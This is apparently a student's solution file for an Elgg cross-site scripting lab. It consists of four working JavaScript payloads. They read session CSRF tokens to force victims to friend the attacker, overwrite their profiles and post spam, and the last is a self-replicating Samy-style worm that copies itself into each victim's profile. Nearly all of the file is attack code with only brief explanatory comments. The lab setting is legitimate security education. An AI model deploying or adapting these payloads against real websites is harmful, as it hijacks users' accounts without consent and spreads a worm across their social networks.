//task1

<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	// I sent friend request to samy from other users.In each request url, I observed friend=47 is fixed for samy.It changes if and only if,
	// i sent request to another user. then there are ts and token.So,i set up the url like this

	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token; //FILL IN

	//Create and send Ajax request to add friend

	// I observed that in the skeleton code, we find ts and token from a get request http://www.xsslabelgg.com/profile/samy. There I found 		// that elgg.session.user.guid is the user id

	if(elgg.session.user.guid!=47){
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	}
</script>

//task2

<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var username=elgg.session.user.username
	var userguid=elgg.session.user.guid
	//Construct the content of your url.
        var sendurl="http://www.xsslabelgg.com/action/profile/edit"
	 //FILL IN
    // I sent an edit request from samy after filling all the field.Then from network portion I click on editand resend. There I     	observed the request body.
	var content=ts+token+"&name="+username+"&description="+"I am a student"+"&accesslevel%5Bdescription%5D=1& briefdescription=1605026&accesslevel%5Bbriefdescription%5D=1&location=malghar&accesslevel%5Blocation%5D=1& interests=Fighting&accesslevel%5Binterests%5D=1&skills=Sleeping&accesslevel%5Bskills%5D=1&contactemail=example@gmail.com& accesslevel%5Bcontactemail%5D=1&phone=33224&accesslevel%5Bphone%5D=1&mobile=018123456789&accesslevel%5Bmobile%5D=1&website=https://www.prothomalo.com&accesslevel%5Bwebsite%5D=1&twitter=wow&accesslevel%5Btwitter%5D=1&guid="+userguid;

	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>

//task 3
<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var username=elgg.session.user.username
	var userguid=elgg.session.user.guid
	// first I visit samy's profile. I copied the profile link.Then I went to the wire.There I make a post using the text.from the network option I click on edit and respond. There I observed the request body.and copy this to postText 
	var postText="To+earn+12+USD%2FHour%28%21%29%2C%0D%0Avisit+now%3A+http%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"; 
	//Construct the content of your url.
        var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	var content=ts+token+"&body="+postText; //FILL IN
	
	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>

//task 4
<script id=worm>
	// this is the combination of first three task
	var headerTag = "<script id=worm>";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	window.onload = function(){
	var ts="__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var username=elgg.session.user.username
	var userguid=elgg.session.user.guid
	var sendurl="http://www.xsslabelgg.com/action/profile/edit";
	var content=ts+token+"&description="+wormCode+"&guid="+userguid+"&name="+username;

	var postText="To+earn+12+USD%2FHour%28%21%29%2C%0D%0Avisit+now%3A+http%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2F"+username; 
	var sendurl1="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	var content1=ts+token+"&body="+postText;

	var sendurl2="http://www.xsslabelgg.com/action/friends/add?friend=47&"+ts+token+"&"+ts+token;

	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}

	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl1,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content1);
	}

	if(elgg.session.user.guid!=47){
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl2,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}

	}
	// alert(jsCode);
	//console.log(jsCode);
</script>
